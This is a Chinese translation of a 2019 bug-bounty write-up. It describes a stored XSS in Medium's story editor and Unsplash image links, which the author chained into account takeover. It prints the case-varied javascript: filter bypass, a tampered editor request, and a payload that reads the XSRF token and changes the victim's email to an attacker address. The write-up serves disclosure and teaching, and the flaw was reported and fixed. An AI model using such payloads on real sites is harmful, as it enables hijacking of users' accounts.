<html>
<head>
<title>Writing my Medium blog to complete account takeover</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">写我的中型博客来完成帐户接管</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/writing-my-medium-blog-to-complete-account-takeover-e65d455c16b?source=collection_archive---------1-----------------------#2019-08-09">https://infosecwriteups.com/writing-my-medium-blog-to-complete-account-takeover-e65d455c16b?source=collection_archive---------1-----------------------#2019-08-09</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="b24a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi kl translated">几周前的一个晚上，我正在写一篇新媒体博客，主题是——为什么公司应该拥抱bug-bounty平台，直到我陷入文思枯竭。</p><p id="7b82" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我心想“让我们花几分钟做点别的事情，然后再回来”。当我需要休息的时候我会做什么？我开始摆弄最近的应用程序，这次是Medium的故事编辑页面。</p><p id="03d5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我不太记得是怎么做的了，但是我注意到我可以用像<code class="fe ku kv kw kx b">mailto:</code>这样的特殊模式添加链接，然后我的第一个想法是——如果我可以使用<code class="fe ku kv kw kx b">mailto:</code>，那么<code class="fe ku kv kw kx b">javascript:</code>呢？</p><figure class="ky kz la lb gt lc"><div class="bz fp l di"><div class="ld le l"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">不，那没用。</figcaption></figure><p id="a379" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我正要继续我的生活，但我脑海中有一个小小的声音在呼喊</p><figure class="ky kz la lb gt lc"><div class="bz fp l di"><div class="lj le l"/></div></figure><p id="bccf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我选择了那个小声音，这一次我尝试了<code class="fe ku kv kw kx b">jAvAsCrIpT:confirm()</code>，我无法相信——成功了。🙄</p><p id="a7a1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">链接被添加到我的故事中，当我作为阅读器打开它并点击链接时，会弹出一个确认对话框。</p><h2 id="3024" class="lk ll iq bd lm ln lo dn lp lq lr dp ls jy lt lu lv kc lw lx ly kg lz ma mb mc bi translated"><strong class="ak">概念验证</strong></h2><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="me mf di mg bf mh"><div class="gh gi md"><img src="../Images/f79a5ed1755e3c392429d9db5e5ed416.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*6KmlmJwt-cLLVVbGqJvPjQ.gif"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">读者点击链接，弹出一个确认对话框</figcaption></figure><p id="3b9d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好了，我在《灵媒的面包和黄油》上找到了一个储存的XSS——它的故事。我报告了这个问题，然后上床睡觉。</p><h2 id="7d1d" class="lk ll iq bd lm ln lo dn lp lq lr dp ls jy lt lu lv kc lw lx ly kg lz ma mb mc bi translated">更多，我想要更多</h2><p id="9ccb" class="pw-post-body-paragraph jn jo iq jp b jq mk js jt ju ml jw jx jy mm ka kb kc mn ke kf kg mo ki kj kk ij bi translated">第二天我醒来时有一个困扰的想法——我只花了5分钟就找到了一个非常简单的存储XSS。真的如此寂寞吗？</p><p id="73b0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我已经添加了一个<em class="mp"> Unsplash图像</em>到一个故事中，并用Burp Suite拦截了这个请求。请求看起来是这样的:</p><pre class="ky kz la lb gt mq kx mr ms aw mt bi"><span id="fa37" class="lk ll iq kx b gy mu mv l mw mx"><em class="mp">POST /p/8f2xxxxxxx/deltas?logLockId=970 HTTP/1.1<br/>Host: medium.com<br/>User-Agent: [Redacted]<br/>Accept: application/json<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate<br/>Referer: https://medium.com/p/</em>8f2xxxxxxx<em class="mp">/edit<br/>X-Obvious-CID: web<br/>X-XSRF-Token: [Redacted]<br/>X-Client-Date: [Redacted]<br/>Content-Type: application/json<br/>Content-Length: 536<br/>Connection: close<br/>Cookie: [Redacted]<br/>{"id":"</em>8f2xxxxxxx<em class="mp">","deltas":[{"type":3,"index":1,"paragraph":{"name":"exxx","type":4,"text":"Photo by Some Author on Unsplash","markups":[{"type":3,"start":9,"end":17,"href":"</em>https://medium.com/r/?url=https%3A%2F%2Funsplash.com%2F%40someauthor%3Futm_source%3Dmedium%26utm_medium%3Dreferral<em class="mp">","title":"","rel":"photo-creator","anchorType":0},{"type":3,"start":21,"end":29,"href":"</em>https://medium.com/r/?url=https%3A%2F%2Funsplash.com%2F%40someauthor%3Futm_source%3Dmedium%26utm_medium%3Dreferral<em class="mp">","title":"","rel":"photo-source","anchorType":0}],"layout":1,"metadata":{"id":"0*xxxxxx","originalWidth":"\"alt='test'","originalHeight":5219,"alt":"","unsplashPhotoId":"xxxxx"}},"verifySameName":true}],"baseRev":28}</em></span></pre><p id="00cb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我将两个href值替换为我在第一个XSS上使用的相同有效载荷。<br/>请求被篡改的正文看起来像:</p><pre class="ky kz la lb gt mq kx mr ms aw mt bi"><span id="d892" class="lk ll iq kx b gy mu mv l mw mx"><em class="mp">{"id":"</em>8f2xxxxxxx<em class="mp">","deltas":[{"type":3,"index":1,"paragraph":{"name":"exxx","type":4,"text":"Photo by Some Author on Unsplash","markups":[{"type":3,"start":9,"end":17,"href":"</em>jAvAsCrIpT:confirm()<em class="mp">","title":"","rel":"photo-creator","anchorType":0},{"type":3,"start":21,"end":29,"href":"</em>jAvAsCrIpT:confirm()<em class="mp">","title":"","rel":"photo-source","anchorType":0}],"layout":1,"metadata":{"id":"0*xxxxxx","originalWidth":"\"alt='test'","originalHeight":5219,"alt":"","unsplashPhotoId":"xxxxx"}},"verifySameName":true}],"baseRev":28}</em></span></pre><p id="54e4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你猜怎么着，成功了！</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="me mf di mg bf mh"><div class="gh gi my"><img src="../Images/aee667f6dcf1fb4a5c1d2a00764d7131.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*h_qTR_ZW0QQPq39b8Vi8xw.gif"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">另一个存储在Unsplash图像组件中的XSS</figcaption></figure><h2 id="f662" class="lk ll iq bd lm ln lo dn lp lq lr dp ls jy lt lu lv kc lw lx ly kg lz ma mb mc bi translated">增加影响</h2><p id="471f" class="pw-post-body-paragraph jn jo iq jp b jq mk js jt ju ml jw jx jy mm ka kb kc mn ke kf kg mo ki kj kk ij bi translated">根据Medium的bug-bounty页面，他们只为XSS支付了100美元，但我想赢得大奖:</p><blockquote class="na nb nc"><p id="ad0e" class="jn jo mp jp b jq jr js jt ju jv jw jx nd jz ka kb ne kd ke kf nf kh ki kj kk ij bi translated">漏洞或绕过重要的安全控制:1000美元</p></blockquote><p id="ae6b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于我已经在一个故事中存储了多个XSS，我想通过<strong class="jp ir">演示一个完整的帐户接管</strong>来增加影响。</p><p id="e54a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于会话cookie被设置为HTTP Only，我们不能只是窃取cookie，我们必须更加努力地工作。<br/>我直接进入我的用户资料，查看我是否可以在不输入密码的情况下用另一个电子邮件更改我的电子邮件，我发现我可以。太好了！所以为了测试，我手动更改了我的电子邮件，使用了“神奇链接”功能，向我的新电子邮件发送了一个临时登录链接，我进入了我的新电子邮件地址帐户。</p><h2 id="f50c" class="lk ll iq bd lm ln lo dn lp lq lr dp ls jy lt lu lv kc lw lx ly kg lz ma mb mc bi translated">自动化攻击</h2><p id="049f" class="pw-post-body-paragraph jn jo iq jp b jq mk js jt ju ml jw jx jy mm ka kb kc mn ke kf kg mo ki kj kk ij bi translated">我们需要执行的步骤是:</p><ul class=""><li id="6421" class="ng nh iq jp b jq jr ju jv jy ni kc nj kg nk kk nl nm nn no bi translated">获取用户的XSRF令牌(我提醒你，没有cookies给你！)</li><li id="551e" class="ng nh iq jp b jq np ju nq jy nr kc ns kg nt kk nl nm nn no bi translated">用新的电子邮件向<code class="fe ku kv kw kx b">/me/email</code>端点发送PUT请求</li></ul><p id="c394" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我使用的最终有效载荷:</p><pre class="ky kz la lb gt mq kx mr ms aw mt bi"><span id="d46d" class="lk ll iq kx b gy mu mv l mw mx"><em class="mp">JaVaScRiPt:var x=window.__PRELOADED_STATE__.session.xsrf;var h = new XMLHttpRequest();h.open(‘PUT’, ‘/me/email’, true);h.setRequestHeader(‘Content-Type’, ‘application/json’);h.setRequestHeader(‘X-XSRF-Token’, x);h.send(‘{“email”:”attacker@malicious.com”}’);</em></span></pre></div><div class="ab cl nu nv hu nw" role="separator"><span class="nx bw bk ny nz oa"/><span class="nx bw bk ny nz oa"/><span class="nx bw bk ny nz"/></div><div class="ij ik il im in"><h2 id="79d7" class="lk ll iq bd lm ln lo dn lp lq lr dp ls jy lt lu lv kc lw lx ly kg lz ma mb mc bi translated">报告时间线</h2><p id="d418" class="pw-post-body-paragraph jn jo iq jp b jq mk js jt ju ml jw jx jy mm ka kb kc mn ke kf kg mo ki kj kk ij bi translated">2019年7月10日—初始报告<br/>2019年7月10日—用Unsplash映像中存储的另一个XSS更新报告<br/>2019年7月12日—用完整的帐户接管演示更新报告<br/>2019年7月13日Medium安全团队的首次回应</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi ob"><img src="../Images/1413791f1d5d9a9a65a13d44dc947979.png" data-original-src="https://miro.medium.com/v2/resize:fit:1222/format:webp/1*ZfQyUvGUmGpRbEEYPi89ZQ.png"/></div></figure><p id="3619" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2019年8月3日—问题已修复，我已获准披露<br/>2019年8月6日—我被添加到<a class="ae mz" href="https://medium.com/humans.txt" rel="noopener">媒体的humans.txt文件</a></p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi oc"><img src="../Images/281dc47e800311c914998a368f3f2e21.png" data-original-src="https://miro.medium.com/v2/resize:fit:1158/format:webp/1*Gp5eq5HQgTzYaEVoLKnSZg.png"/></div></figure></div><div class="ab cl nu nv hu nw" role="separator"><span class="nx bw bk ny nz oa"/><span class="nx bw bk ny nz oa"/><span class="nx bw bk ny nz"/></div><div class="ij ik il im in"><p id="679f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是我的第一篇技术bug-bounty文章，希望你喜欢。如果你有，请随时关注我。</p><p id="f99f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢Medium的安全团队以超级专业的方式处理了这份报告，并允许披露。</p></div></div>    
</body>
</html>